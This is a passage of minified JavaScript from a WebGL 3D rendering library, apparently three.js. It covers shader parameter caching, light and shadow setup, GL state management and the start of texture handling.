axMorphNormals","premultipliedAlpha","numDirLights","numPointLights","numSpotLights","numHemiLights","numRectAreaLights","numDirLightShadows","numPointLightShadows","numSpotLightShadows","shadowMapEnabled","shadowMapType","toneMapping","physicallyCorrectLights","alphaTest","doubleSided","flipSided","numClippingPlanes","numClipIntersection","depthPacking","dithering","sheen","transmissionMap"];function v(e){var t;return e?e.isTexture?t=e.encoding:e.isWebGLRenderTarget&&(t=e.texture.encoding):t=D,t}return{getParameters:function(i,l,m,g,y){var b,_,w=g.fog,C=i.isMeshStandardMaterial?g.environment:null,x=t.get(i.envMap||C),S=A[i.type],k=y.isSkinnedMesh?function(e){var t=e.skeleton.bones;if(d)return 1024;var n=p,r=Math.floor((n-20)/4),i=Math.min(r,t.length);return i<t.length?0:i}(y):0;if(null!==i.precision&&(f=r.getMaxPrecision(i.precision),i.precision),S){var M=Wn[S];b=M.vertexShader,_=M.fragmentShader}else b=i.vertexShader,_=i.fragmentShader;var B=e.getRenderTarget();return{isWebGL2:c,shaderID:S,shaderName:i.type,vertexShader:b,fragmentShader:_,defines:i.defines,isRawShaderMaterial:!0===i.isRawShaderMaterial,glslVersion:i.glslVersion,precision:f,instancing:!0===y.isInstancedMesh,instancingColor:!0===y.isInstancedMesh&&null!==y.instanceColor,supportsVertexTextures:h,outputEncoding:null!==B?v(B.texture):e.outputEncoding,map:!!i.map,mapEncoding:v(i.map),matcap:!!i.matcap,matcapEncoding:v(i.matcap),envMap:!!x,envMapMode:x&&x.mapping,envMapEncoding:v(x),envMapCubeUV:!!x&&(x.mapping===o||x.mapping===s),lightMap:!!i.lightMap,lightMapEncoding:v(i.lightMap),aoMap:!!i.aoMap,emissiveMap:!!i.emissiveMap,emissiveMapEncoding:v(i.emissiveMap),bumpMap:!!i.bumpMap,normalMap:!!i.normalMap,objectSpaceNormalMap:1===i.normalMapType,tangentSpaceNormalMap:0===i.normalMapType,clearcoatMap:!!i.clearcoatMap,clearcoatRoughnessMap:!!i.clearcoatRoughnessMap,clearcoatNormalMap:!!i.clearcoatNormalMap,displacementMap:!!i.displacementMap,roughnessMap:!!i.roughnessMap,metalnessMap:!!i.metalnessMap,specularMap:!!i.specularMap,alphaMap:!!i.alphaMap,gradientMap:!!i.gradientMap,sheen:!!i.sheen,transmissionMap:!!i.transmissionMap,combine:i.combine,vertexTangents:i.normalMap&&i.vertexTangents,vertexColors:i.vertexColors,vertexUvs:!!(i.map||i.bumpMap||i.normalMap||i.specularMap||i.alphaMap||i.emissiveMap||i.roughnessMap||i.metalnessMap||i.clearcoatMap||i.clearcoatRoughnessMap||i.clearcoatNormalMap||i.displacementMap||i.transmissionMap),uvsVertexOnly:!(i.map||i.bumpMap||i.normalMap||i.specularMap||i.alphaMap||i.emissiveMap||i.roughnessMap||i.metalnessMap||i.clearcoatNormalMap||i.transmissionMap||!i.displacementMap),fog:!!w,useFog:i.fog,fogExp2:w&&w.isFogExp2,flatShading:i.flatShading,sizeAttenuation:i.sizeAttenuation,logarithmicDepthBuffer:u,skinning:i.skinning&&0<k,maxBones:k,useVertexTexture:d,morphTargets:i.morphTargets,morphNormals:i.morphNormals,maxMorphTargets:e.maxMorphTargets,maxMorphNormals:e.maxMorphNormals,numDirLights:l.directional.length,numPointLights:l.point.length,numSpotLights:l.spot.length,numRectAreaLights:l.rectArea.length,numHemiLights:l.hemi.length,numDirLightShadows:l.directionalShadowMap.length,numPointLightShadows:l.pointShadowMap.length,numSpotLightShadows:l.spotShadowMap.length,numClippingPlanes:a.numPlanes,numClipIntersection:a.numIntersection,dithering:i.dithering,shadowMapEnabled:e.shadowMap.enabled&&0<m.length,shadowMapType:e.shadowMap.type,toneMapping:i.toneMapped?e.toneMapping:0,physicallyCorrectLights:e.physicallyCorrectLights,premultipliedAlpha:i.premultipliedAlpha,alphaTest:i.alphaTest,doubleSided:2===i.side,flipSided:1===i.side,depthPacking:void 0!==i.depthPacking&&i.depthPacking,index0AttributeName:i.index0AttributeName,extensionDerivatives:i.extensions&&i.extensions.derivatives,extensionFragDepth:i.extensions&&i.extensions.fragDepth,extensionDrawBuffers:i.extensions&&i.extensions.drawBuffers,extensionShaderTextureLOD:i.extensions&&i.extensions.shaderTextureLOD,rendererExtensionFragDepth:c||n.has("EXT_frag_depth"),rendererExtensionDrawBuffers:c||n.has("WEBGL_draw_buffers"),rendererExtensionShaderTextureLod:c||n.has("EXT_shader_texture_lod"),customProgramCacheKey:i.customProgramCacheKey()}},getProgramCacheKey:function(t){var n=[];if(t.shaderID?n.push(t.shaderID):(n.push(t.fragmentShader),n.push(t.vertexShader)),void 0!==t.defines)for(var r in t.defines)n.push(r),n.push(t.defines[r]);if(!1===t.isRawShaderMaterial){for(var i=0;i<m.length;i++)n.push(t[m[i]]);n.push(e.outputEncoding),n.push(e.gammaFactor)}return n.push(t.customProgramCacheKey),n.join()},getUniforms:function(e){var t,n=A[e.type];if(n){var r=Wn[n];t=Pn.clone(r.uniforms)}else t=e.uniforms;return t},acquireProgram:function(t,n){for(var r,a=0,o=l.length;a<o;a++){var s=l[a];if(s.cacheKey===n){++(r=s).usedTimes;break}}return void 0===r&&(r=new wi(e,n,t,i),l.push(r)),r},releaseProgram:function(e){if(0==--e.usedTimes){var t=l.indexOf(e);l[t]=l[l.length-1],l.pop(),e.destroy()}},programs:l}}function xi(){var e=new WeakMap;return{get:function(t){var n=e.get(t);return void 0===n&&(n={},e.set(t,n)),n},remove:function(t){e.delete(t)},update:function(t,n,r){e.get(t)[n]=r},dispose:function(){e=new WeakMap}}}function Si(e,t){return e.groupOrder!==t.groupOrder?e.groupOrder-t.groupOrder:e.renderOrder!==t.renderOrder?e.renderOrder-t.renderOrder:e.program!==t.program?e.program.id-t.program.id:e.material.id!==t.material.id?e.material.id-t.material.id:e.z!==t.z?e.z-t.z:e.id-t.id}function ki(e,t){return e.groupOrder!==t.groupOrder?e.groupOrder-t.groupOrder:e.renderOrder!==t.renderOrder?e.renderOrder-t.renderOrder:e.z!==t.z?t.z-e.z:e.id-t.id}function Mi(e){var t=[],n=0,r=[],i=[],a={id:-1};function o(r,i,o,s,l,c){var u=t[n],d=e.get(o);return void 0===u?(u={id:r.id,object:r,geometry:i,material:o,program:d.program||a,groupOrder:s,renderOrder:r.renderOrder,z:l,group:c},t[n]=u):(u.id=r.id,u.object=r,u.geometry=i,u.material=o,u.program=d.program||a,u.groupOrder=s,u.renderOrder=r.renderOrder,u.z=l,u.group=c),n++,u}return{opaque:r,transparent:i,init:function(){n=0,r.length=0,i.length=0},push:function(e,t,n,a,s,l){var c=o(e,t,n,a,s,l);(!0===n.transparent?i:r).push(c)},unshift:function(e,t,n,a,s,l){var c=o(e,t,n,a,s,l);(!0===n.transparent?i:r).unshift(c)},finish:function(){for(var e=n,r=t.length;e<r;e++){var i=t[e];if(null===i.id)break;i.id=null,i.object=null,i.geometry=null,i.material=null,i.program=null,i.group=null}},sort:function(e,t){1<r.length&&r.sort(e||Si),1<i.length&&i.sort(t||ki)}}}function Bi(e){var t=new WeakMap;return{get:function(n,r){var i,a=t.get(n);return void 0===a?(i=new Mi(e),t.set(n,new WeakMap),t.get(n).set(r,i)):void 0===(i=a.get(r))&&(i=new Mi(e),a.set(r,i)),i},dispose:function(){t=new WeakMap}}}function Ei(){var e={};return{get:function(t){if(void 0!==e[t.id])return e[t.id];var n;switch(t.type){case"DirectionalLight":n={direction:new he,color:new Lt};break;case"SpotLight":n={position:new he,direction:new he,color:new Lt,distance:0,coneCos:0,penumbraCos:0,decay:0};break;case"PointLight":n={position:new he,color:new Lt,distance:0,decay:0};break;case"HemisphereLight":n={direction:new he,skyColor:new Lt,groundColor:new Lt};break;case"RectAreaLight":n={color:new Lt,position:new he,halfWidth:new he,halfHeight:new he}}return e[t.id]=n}}}var Ti=0;function Pi(e,t){return(t.castShadow?1:0)-(e.castShadow?1:0)}function Ii(e,t){for(var n,r=new Ei,i=(n={},{get:function(e){if(void 0!==n[e.id])return n[e.id];var t;switch(e.type){case"DirectionalLight":case"SpotLight":t={shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new ie};break;case"PointLight":t={shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new ie,shadowCameraNear:1,shadowCameraFar:1e3}}return n[e.id]=t}}),a={version:0,hash:{directionalLength:-1,pointLength:-1,spotLength:-1,rectAreaLength:-1,hemiLength:-1,numDirectionalShadows:-1,numPointShadows:-1,numSpotShadows:-1},ambient:[0,0,0],probe:[],directional:[],directionalShadow:[],directionalShadowMap:[],directionalShadowMatrix:[],spot:[],spotShadow:[],spotShadowMap:[],spotShadowMatrix:[],rectArea:[],rectAreaLTC1:null,rectAreaLTC2:null,point:[],pointShadow:[],pointShadowMap:[],pointShadowMatrix:[],hemi:[]},o=0;o<9;o++)a.probe.push(new he);var s=new he,l=new $e,c=new $e;return{setup:function(n,o,u){for(var d=0,p=0,h=0,f=0;f<9;f++)a.probe[f].set(0,0,0);var A=0,m=0,v=0,g=0,y=0,b=0,_=0,w=0,C=u.matrixWorldInverse;n.sort(Pi);for(var x=0,S=n.length;x<S;x++){var k=n[x],M=k.color,B=k.intensity,E=k.distance,T=k.shadow&&k.shadow.map?k.shadow.map.texture:null;if(k.isAmbientLight)d+=M.r*B,p+=M.g*B,h+=M.b*B;else if(k.isLightProbe)for(var P=0;P<9;P++)a.probe[P].addScaledVector(k.sh.coefficients[P],B);else if(k.isDirectionalLight){var I=r.get(k);if(I.color.copy(k.color).multiplyScalar(k.intensity),I.direction.setFromMatrixPosition(k.matrixWorld),s.setFromMatrixPosition(k.target.matrixWorld),I.direction.sub(s),I.direction.transformDirection(C),k.castShadow){var F=k.shadow,L=i.get(k);L.shadowBias=F.bias,L.shadowNormalBias=F.normalBias,L.shadowRadius=F.radius,L.shadowMapSize=F.mapSize,a.directionalShadow[A]=L,a.directionalShadowMap[A]=T,a.directionalShadowMatrix[A]=k.shadow.matrix,b++}a.directional[A]=I,A++}else if(k.isSpotLight){var O=r.get(k);if(O.position.setFromMatrixPosition(k.matrixWorld),O.position.applyMatrix4(C),O.color.copy(M).multiplyScalar(B),O.distance=E,O.direction.setFromMatrixPosition(k.matrixWorld),s.setFromMatrixPosition(k.target.matrixWorld),O.direction.sub(s),O.direction.transformDirection(C),O.coneCos=Math.cos(k.angle),O.penumbraCos=Math.cos(k.angle*(1-k.penumbra)),O.decay=k.decay,k.castShadow){var N=k.shadow,D=i.get(k);D.shadowBias=N.bias,D.shadowNormalBias=N.normalBias,D.shadowRadius=N.radius,D.shadowMapSize=N.mapSize,a.spotShadow[v]=D,a.spotShadowMap[v]=T,a.spotShadowMatrix[v]=k.shadow.matrix,w++}a.spot[v]=O,v++}else if(k.isRectAreaLight){var R=r.get(k);R.color.copy(M).multiplyScalar(B),R.position.setFromMatrixPosition(k.matrixWorld),R.position.applyMatrix4(C),c.identity(),l.copy(k.matrixWorld),l.premultiply(C),c.extractRotation(l),R.halfWidth.set(.5*k.width,0,0),R.halfHeight.set(0,.5*k.height,0),R.halfWidth.applyMatrix4(c),R.halfHeight.applyMatrix4(c),a.rectArea[g]=R,g++}else if(k.isPointLight){var j=r.get(k);if(j.position.setFromMatrixPosition(k.matrixWorld),j.position.applyMatrix4(C),j.color.copy(k.color).multiplyScalar(k.intensity),j.distance=k.distance,j.decay=k.decay,k.castShadow){var U=k.shadow,$=i.get(k);$.shadowBias=U.bias,$.shadowNormalBias=U.normalBias,$.shadowRadius=U.radius,$.shadowMapSize=U.mapSize,$.shadowCameraNear=U.camera.near,$.shadowCameraFar=U.camera.far,a.pointShadow[m]=$,a.pointShadowMap[m]=T,a.pointShadowMatrix[m]=k.shadow.matrix,_++}a.point[m]=j,m++}else if(k.isHemisphereLight){var z=r.get(k);z.direction.setFromMatrixPosition(k.matrixWorld),z.direction.transformDirection(C),z.direction.normalize(),z.skyColor.copy(k.color).multiplyScalar(B),z.groundColor.copy(k.groundColor).multiplyScalar(B),a.hemi[y]=z,y++}}0<g&&(t.isWebGL2||!0===e.has("OES_texture_float_linear")?(a.rectAreaLTC1=Gn.LTC_FLOAT_1,a.rectAreaLTC2=Gn.LTC_FLOAT_2):!0===e.has("OES_texture_half_float_linear")&&(a.rectAreaLTC1=Gn.LTC_HALF_1,a.rectAreaLTC2=Gn.LTC_HALF_2)),a.ambient[0]=d,a.ambient[1]=p,a.ambient[2]=h;var H=a.hash;H.directionalLength===A&&H.pointLength===m&&H.spotLength===v&&H.rectAreaLength===g&&H.hemiLength===y&&H.numDirectionalShadows===b&&H.numPointShadows===_&&H.numSpotShadows===w||(a.directional.length=A,a.spot.length=v,a.rectArea.length=g,a.point.length=m,a.hemi.length=y,a.directionalShadow.length=b,a.directionalShadowMap.length=b,a.pointShadow.length=_,a.pointShadowMap.length=_,a.spotShadow.length=w,a.spotShadowMap.length=w,a.directionalShadowMatrix.length=b,a.pointShadowMatrix.length=_,a.spotShadowMatrix.length=w,H.directionalLength=A,H.pointLength=m,H.spotLength=v,H.rectAreaLength=g,H.hemiLength=y,H.numDirectionalShadows=b,H.numPointShadows=_,H.numSpotShadows=w,a.version=Ti++)},state:a}}function Fi(e,t){var n=new Ii(e,t),r=[],i=[];return{init:function(){r.length=0,i.length=0},state:{lightsArray:r,shadowsArray:i,lights:n},setupLights:function(e){n.setup(r,i,e)},pushLight:function(e){r.push(e)},pushShadow:function(e){i.push(e)}}}function Li(e,t){var n=new WeakMap;return{get:function(r,i){var a;return!1===n.has(r)?(a=new Fi(e,t),n.set(r,new WeakMap),n.get(r).set(i,a)):!1===n.get(r).has(i)?(a=new Fi(e,t),n.get(r).set(i,a)):a=n.get(r).get(i),a},dispose:function(){n=new WeakMap}}}function Oi(e){Dt.call(this),this.type="MeshDepthMaterial",this.depthPacking=3200,this.skinning=!1,this.morphTargets=!1,this.map=null,this.alphaMap=null,this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.wireframe=!1,this.wireframeLinewidth=1,this.fog=!1,this.setValues(e)}function Ni(e){Dt.call(this),this.type="MeshDistanceMaterial",this.referencePosition=new he,this.nearDistance=1,this.farDistance=1e3,this.skinning=!1,this.morphTargets=!1,this.map=null,this.alphaMap=null,this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.fog=!1,this.setValues(e)}((Oi.prototype=Object.create(Dt.prototype)).constructor=Oi).prototype.isMeshDepthMaterial=!0,Oi.prototype.copy=function(e){return Dt.prototype.copy.call(this,e),this.depthPacking=e.depthPacking,this.skinning=e.skinning,this.morphTargets=e.morphTargets,this.map=e.map,this.alphaMap=e.alphaMap,this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this},((Ni.prototype=Object.create(Dt.prototype)).constructor=Ni).prototype.isMeshDistanceMaterial=!0,Ni.prototype.copy=function(e){return Dt.prototype.copy.call(this,e),this.referencePosition.copy(e.referencePosition),this.nearDistance=e.nearDistance,this.farDistance=e.farDistance,this.skinning=e.skinning,this.morphTargets=e.morphTargets,this.map=e.map,this.alphaMap=e.alphaMap,this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this};function Di(e,t,n){var r=new $n,i=new ie,a=new ie,o=new ce,s=[],l=[],c={},u={0:1,1:0,2:2},p=new In({defines:{SAMPLE_RATE:.25,HALF_SAMPLE_RATE:1/8},uniforms:{shadow_pass:{value:null},resolution:{value:new ie},radius:{value:4}},vertexShader:"void main() {\n\tgl_Position = vec4( position, 1.0 );\n}",fragmentShader:"uniform sampler2D shadow_pass;\nuniform vec2 resolution;\nuniform float radius;\n#include <packing>\nvoid main() {\n\tfloat mean = 0.0;\n\tfloat squared_mean = 0.0;\n\tfloat depth = unpackRGBAToDepth( texture2D( shadow_pass, ( gl_FragCoord.xy ) / resolution ) );\n\tfor ( float i = -1.0; i < 1.0 ; i += SAMPLE_RATE) {\n\t\t#ifdef HORIZONAL_PASS\n\t\t\tvec2 distribution = unpackRGBATo2Half( texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( i, 0.0 ) * radius ) / resolution ) );\n\t\t\tmean += distribution.x;\n\t\t\tsquared_mean += distribution.y * distribution.y + distribution.x * distribution.x;\n\t\t#else\n\t\t\tfloat depth = unpackRGBAToDepth( texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( 0.0, i ) * radius ) / resolution ) );\n\t\t\tmean += depth;\n\t\t\tsquared_mean += depth * depth;\n\t\t#endif\n\t}\n\tmean = mean * HALF_SAMPLE_RATE;\n\tsquared_mean = squared_mean * HALF_SAMPLE_RATE;\n\tfloat std_dev = sqrt( squared_mean - mean * mean );\n\tgl_FragColor = pack2HalfToRGBA( vec2( mean, std_dev ) );\n}"}),h=p.clone();h.defines.HORIZONAL_PASS=1;var A=new sn;A.setAttribute("position",new $t(new Float32Array([-1,-1,.5,3,-1,.5,-1,3,.5]),3));var m=new Sn(A,p),v=this;function g(n,r){var i=t.update(m);p.uniforms.shadow_pass.value=n.map.texture,p.uniforms.resolution.value=n.mapSize,p.uniforms.radius.value=n.radius,e.setRenderTarget(n.mapPass),e.clear(),e.renderBufferDirect(r,null,i,p,m,null),h.uniforms.shadow_pass.value=n.mapPass.texture,h.uniforms.resolution.value=n.mapSize,h.uniforms.radius.value=n.radius,e.setRenderTarget(n.map),e.clear(),e.renderBufferDirect(r,null,i,h,m,null)}function y(e,t,n){var r=e<<0|t<<1|n<<2,i=s[r];return void 0===i&&(i=new Oi({depthPacking:3201,morphTargets:e,skinning:t}),s[r]=i),i}function b(e,t,n){var r=e<<0|t<<1|n<<2,i=l[r];return void 0===i&&(i=new Ni({morphTargets:e,skinning:t}),l[r]=i),i}function _(t,n,r,i,a,o,s){var l=null,d=y,p=t.customDepthMaterial;if(!0===i.isPointLight&&(d=b,p=t.customDistanceMaterial),void 0===p){var h=!1;!0===r.morphTargets&&(h=n.morphAttributes&&n.morphAttributes.position&&0<n.morphAttributes.position.length);var f=!1;!0===t.isSkinnedMesh&&!0===r.skinning&&(f=!0),l=d(h,f,!0===t.isInstancedMesh)}else l=p;if(e.localClippingEnabled&&!0===r.clipShadows&&0!==r.clippingPlanes.length){var A=l.uuid,m=r.uuid,v=c[A];void 0===v&&(v={},c[A]=v);var g=v[m];void 0===g&&(g=l.clone(),v[m]=g),l=g}return l.visible=r.visible,l.wireframe=r.wireframe,l.side=3===s?null!==r.shadowSide?r.shadowSide:r.side:null!==r.shadowSide?r.shadowSide:u[r.side],l.clipShadows=r.clipShadows,l.clippingPlanes=r.clippingPlanes,l.clipIntersection=r.clipIntersection,l.wireframeLinewidth=r.wireframeLinewidth,l.linewidth=r.linewidth,!0===i.isPointLight&&!0===l.isMeshDistanceMaterial&&(l.referencePosition.setFromMatrixPosition(i.matrixWorld),l.nearDistance=a,l.farDistance=o),l}function w(n,i,a,o,s){if(!1!==n.visible){if(n.layers.test(i.layers)&&(n.isMesh||n.isLine||n.isPoints)&&(n.castShadow||n.receiveShadow&&3===s)&&(!n.frustumCulled||r.intersectsObject(n))){n.modelViewMatrix.multiplyMatrices(a.matrixWorldInverse,n.matrixWorld);var l=t.update(n),c=n.material;if(Array.isArray(c))for(var u=l.groups,d=0,p=u.length;d<p;d++){var h=u[d],f=c[h.materialIndex];if(f&&f.visible){var A=_(n,l,f,o,a.near,a.far,s);e.renderBufferDirect(a,null,l,A,n,h)}}else if(c.visible){var m=_(n,l,c,o,a.near,a.far,s);e.renderBufferDirect(a,null,l,m,n,null)}}for(var v=n.children,g=0,y=v.length;g<y;g++)w(v[g],i,a,o,s)}}this.enabled=!1,this.autoUpdate=!0,this.needsUpdate=!1,this.type=1,this.render=function(t,s,l){if(!1!==v.enabled&&(!1!==v.autoUpdate||!1!==v.needsUpdate)&&0!==t.length){var c=e.getRenderTarget(),u=e.getActiveCubeFace(),p=e.getActiveMipmapLevel(),h=e.state;h.setBlending(0),h.buffers.color.setClear(1,1,1,1),h.buffers.depth.setTest(!0),h.setScissorTest(!1);for(var A=0,m=t.length;A<m;A++){var y=t[A],b=y.shadow;if(void 0!==b&&(!1!==b.autoUpdate||!1!==b.needsUpdate)){i.copy(b.mapSize);var _=b.getFrameExtents();if(i.multiply(_),a.copy(b.mapSize),(i.x>n||i.y>n)&&(i.x>n&&(a.x=Math.floor(n/_.x),i.x=a.x*_.x,b.mapSize.x=a.x),i.y>n&&(a.y=Math.floor(n/_.y),i.y=a.y*_.y,b.mapSize.y=a.y)),null===b.map&&!b.isPointLightShadow&&3===this.type){var C={minFilter:f,magFilter:f,format:x};b.map=new ue(i.x,i.y,C),b.map.texture.name=y.name+".shadowMap",b.mapPass=new ue(i.x,i.y,C),b.camera.updateProjectionMatrix()}if(null===b.map){var S={minFilter:d,magFilter:d,format:x};b.map=new ue(i.x,i.y,S),b.map.texture.name=y.name+".shadowMap",b.camera.updateProjectionMatrix()}e.setRenderTarget(b.map),e.clear();for(var k=b.getViewportCount(),M=0;M<k;M++){var B=b.getViewport(M);o.set(a.x*B.x,a.y*B.y,a.x*B.z,a.y*B.w),h.viewport(o),b.updateMatrices(y,M),r=b.getFrustum(),w(s,l,b.camera,y,this.type)}b.isPointLightShadow||3!==this.type||g(b,l),b.needsUpdate=!1}}v.needsUpdate=!1,e.setRenderTarget(c,u,p)}}}function Ri(e,n,r){var i,a,o=r.isWebGL2,s=new function(){var t=!1,n=new ce,r=null,i=new ce(0,0,0,0);return{setMask:function(n){r===n||t||(e.colorMask(n,n,n,n),r=n)},setLocked:function(e){t=e},setClear:function(t,r,a,o,s){!0===s&&(t*=o,r*=o,a*=o),n.set(t,r,a,o),!1===i.equals(n)&&(e.clearColor(t,r,a,o),i.copy(n))},reset:function(){t=!1,r=null,i.set(-1,0,0,0)}}},l=new function(){var t=!1,n=null,r=null,i=null;return{setTest:function(e){e?N(2929):D(2929)},setMask:function(r){n===r||t||(e.depthMask(r),n=r)},setFunc:function(t){if(r!==t){if(t)switch(t){case 0:e.depthFunc(512);break;case 1:e.depthFunc(519);break;case 2:e.depthFunc(513);break;case 3:e.depthFunc(515);break;case 4:e.depthFunc(514);break;case 5:e.depthFunc(518);break;case 6:e.depthFunc(516);break;case 7:e.depthFunc(517);break;default:e.depthFunc(515)}else e.depthFunc(515);r=t}},setLocked:function(e){t=e},setClear:function(t){i!==t&&(e.clearDepth(t),i=t)},reset:function(){t=!1,i=r=n=null}}},c=new function(){var t=!1,n=null,r=null,i=null,a=null,o=null,s=null,l=null,c=null;return{setTest:function(e){t||(e?N(2960):D(2960))},setMask:function(r){n===r||t||(e.stencilMask(r),n=r)},setFunc:function(t,n,o){r===t&&i===n&&a===o||(e.stencilFunc(t,n,o),r=t,i=n,a=o)},setOp:function(t,n,r){o===t&&s===n&&l===r||(e.stencilOp(t,n,r),o=t,s=n,l=r)},setLocked:function(e){t=e},setClear:function(t){c!==t&&(e.clearStencil(t),c=t)},reset:function(){t=!1,c=l=s=o=a=i=r=n=null}}},u={},d=null,p=null,h=null,f=null,A=null,m=null,v=null,g=null,y=null,b=!1,_=null,w=null,C=null,x=null,S=null,k=e.getParameter(35661),M=!1,B=0,E=e.getParameter(7938);-1!==E.indexOf("WebGL")?(B=parseFloat(/^WebGL\ ([0-9])/.exec(E)[1]),M=1<=B):-1!==E.indexOf("OpenGL ES")&&(B=parseFloat(/^OpenGL\ ES\ ([0-9])/.exec(E)[1]),M=2<=B);var T=null,P={},I=new ce,F=new ce;function L(t,n,r){var i=new Uint8Array(4),a=e.createTexture();e.bindTexture(t,a),e.texParameteri(t,10241,9728),e.texParameteri(t,10240,9728);for(var o=0;o<r;o++)e.texImage2D(n+o,0,6408,1,1,0,6408,5121,i);return a}var O={};function N(t){!0!==u[t]&&(e.enable(t),u[t]=!0)}function D(t){!1!==u[t]&&(e.disable(t),u[t]=!1)}O[3553]=L(3553,3553,1),O[34067]=L(34067,34069,6),s.setClear(0,0,0,1),l.setClear(1),c.setClear(0),N(2929),l.setFunc(3),z(!1),H(1),N(2884),$(0);var R=((i={})[t]=32774,i[101]=32778,i[102]=32779,i);if(o)R[103]=32775,R[104]=32776;else{var j=n.get("EXT_blend_minmax");null!==j&&(R[103]=j.MIN_EXT,R[104]=j.MAX_EXT)}var U=((a={})[200]=0,a[201]=1,a[202]=768,a[204]=770,a[210]=776,a[208]=774,a[206]=772,a[203]=769,a[205]=771,a[209]=775,a[207]=773,a);function $(n,r,i,a,o,s,l,c){if(0!==n){if(p||(N(3042),p=!0),5===n)o=o||r,s=s||i,l=l||a,r===f&&o===v||(e.blendEquationSeparate(R[r],R[o]),f=r,v=o),i===A&&a===m&&s===g&&l===y||(e.blendFuncSeparate(U[i],U[a],U[s],U[l]),A=i,m=a,g=s,y=l),h=n,b=null;else if(n!==h||c!==b){if(f===t&&v===t||(e.blendEquation(32774),v=f=t),c)switch(n){case 1:e.blendFuncSeparate(1,771,1,771);break;case 2:e.blendFunc(1,1);break;case 3:e.blendFuncSeparate(0,0,769,771);break;case 4:e.blendFuncSeparate(0,768,0,770)}else switch(n){case 1:e.blendFuncSeparate(770,771,1,771);break;case 2:e.blendFunc(770,1);break;case 3:e.blendFunc(0,769);break;case 4:e.blendFunc(0,768)}y=g=m=A=null,h=n,b=c}}else p&&(D(3042),p=!1)}function z(t){_!==t&&(t?e.frontFace(2304):e.frontFace(2305),_=t)}function H(t){0!==t?(N(2884),t!==w&&(1===t?e.cullFace(1029):2===t?e.cullFace(1028):e.cullFace(1032))):D(2884),w=t}function V(t,n,r){t?(N(32823),x===n&&S===r||(e.polygonOffset(n,r),x=n,S=r)):D(32823)}function Q(t){void 0===t&&(t=33984+k-1),T!==t&&(e.activeTexture(t),T=t)}return{buffers:{color:s,depth:l,stencil:c},enable:N,disable:D,useProgram:function(t){return d!==t&&(e.useProgram(t),d=t,!0)},setBlending:$,setMaterial:function(e,t){2===e.side?D(2884):N(2884);var n=1===e.side;t&&(n=!n),z(n),1===e.blending&&!1===e.transparent?$(0):$(e.blending,e.blendEquation,e.blendSrc,e.blendDst,e.blendEquationAlpha,e.blendSrcAlpha,e.blendDstAlpha,e.premultipliedAlpha),l.setFunc(e.depthFunc),l.setTest(e.depthTest),l.setMask(e.depthWrite),s.setMask(e.colorWrite);var r=e.stencilWrite;c.setTest(r),r&&(c.setMask(e.stencilWriteMask),c.setFunc(e.stencilFunc,e.stencilRef,e.stencilFuncMask),c.setOp(e.stencilFail,e.stencilZFail,e.stencilZPass)),V(e.polygonOffset,e.polygonOffsetFactor,e.polygonOffsetUnits)},setFlipSided:z,setCullFace:H,setLineWidth:function(t){t!==C&&(M&&e.lineWidth(t),C=t)},setPolygonOffset:V,setScissorTest:function(e){e?N(3089):D(3089)},activeTexture:Q,bindTexture:function(t,n){null===T&&Q();var r=P[T];void 0===r&&(r={type:void 0,texture:void 0},P[T]=r),r.type===t&&r.texture===n||(e.bindTexture(t,n||O[t]),r.type=t,r.texture=n)},unbindTexture:function(){var t=P[T];void 0!==t&&void 0!==t.type&&(e.bindTexture(t.type,null),t.type=void 0,t.texture=void 0)},compressedTexImage2D:function(){try{e.compressedTexImage2D.apply(e,arguments)}catch(e){}},texImage2D:function(){try{e.texImage2D.apply(e,arguments)}catch(e){}},texImage3D:function(){try{e.texImage3D.apply(e,arguments)}catch(e){}},scissor:function(t){!1===I.equals(t)&&(e.scissor(t.x,t.y,t.z,t.w),I.copy(t))},viewport:function(t){!1===F.equals(t)&&(e.viewport(t.x,t.y,t.z,t.w),F.copy(t))},reset:function(){u={},P={},w=_=h=d=T=null,s.reset(),l.reset(),c.reset()}}}function ji(e,t,n,r,i,a,o){var s,v,M,B=i.isWebGL2,E=(i.maxTextures,i.maxCubemapSize),T=i.maxTextureSize,P=i.maxSamples,I=new WeakMap,F=!1;try{F="undefined"!=typeof OffscreenCanvas&&null!==new OffscreenCanvas(1,1).getContext("2d")}catch(s){}function L(e,t){return F?new OffscreenCanvas(e,t):document.createElementNS("http://www.w3.org/1999/xhtml","canvas")}function O(e,t,n,r){var i=1;if((e.width>r||e.height>r)&&(i=r/Math.max(e.width,e.height)),i<1||!0===t){if("undefined"!=typeof HTMLImageElement&&e instanceof HTMLImageElement||"undefined"!=typeof HTMLCanvasElement&&e instanceof HTMLCanvasElement||"undefined"!=typeof ImageBitmap&&e instanceof ImageBitmap){var a=t?J.floorPowerOfTwo:Math.floor,o=a(i*e.width),s=a(i*e.height);void 0===M&&(M=L(o,s));var l=n?L(o,s):M;return l.width=o,l.height=s,l.getContext("2d").drawImage(e,0,0,o,s),l}return e}return e}function N(e){return J.isPowerOfTwo(e.width)&&J.isPowerOfTwo(e.height)}function D(e,t){return e.generateMipmaps&&t&&e.minFilter!==d&&e.minFilter!==f}function R(t,n,i,a){e.generateMipmap(t),r.get(n).__maxMipLevel=Math.log(Math.max(i,a))*Math.LOG2E}function j(n,r,i){if(!1===B)return r;if(null!==n&&void 0!==e[n])return e[n];var a=r;return 6403===r&&(5126===i&&(a=33326),5131===i&&(a=33325),5121===i&&(a=33321)),6407===r&&(5126===i&&(a=34837),5131===i&&(a=34843),5121===i&&(a=32849)),6408===r&&(5126===i&&(a=34836),5131===i&&(a=34842),5121===i&&(a=32856)),33325!==a&&33326!==a&&34842!==a&&34836!==a||t.get("EXT_color_buffer_float"),a}function U(e){return e===d||e===p||e===h?9728:9729}function $(t){var n=t.target;n.removeEventListener("dispose",$),function(t){var n=r.get(t);void 0!==n.__webglInit&&(e.deleteTexture(n.__webglTexture),r.remove(t))}(n),n.isVideoTexture&&I.delete(n),o.memory.textures--}function z(t){var n=t.target;n.removeEventListener("dispose",z),function(t){var n=r.get(t),i=r.get(t.texture);if(t){if(void 